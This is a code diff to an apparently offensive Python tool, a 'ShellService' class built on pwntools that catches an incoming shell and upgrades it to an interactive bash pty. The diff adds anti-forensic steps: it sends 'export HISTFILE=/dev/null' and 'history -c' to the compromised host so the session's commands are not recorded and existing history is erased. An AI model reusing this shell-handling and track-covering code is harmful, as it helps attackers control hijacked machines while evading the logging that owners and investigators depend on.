@@ -1,6 +1,5 @@
 import requests, sys, tty
 from pwnlib.tubes.listen import listen
-from pwnlib.log import getLogger
 
 
 class ShellService:
@@ -27,7 +26,9 @@ class ShellService:
         # Get pty
         shell.sendline(b"""python -c 'import pty; pty.spawn("/bin/bash")'; exit""")
         shell.recv(timeout = None) # Wait for pty to spawn
+        shell.sendline(b'export HISTFILE=/dev/null')
         shell.sendline(b'export TERM=xterm')
+        shell.sendline(b'history -c')
         shell.clean()
         shell.sendline(b'')
 
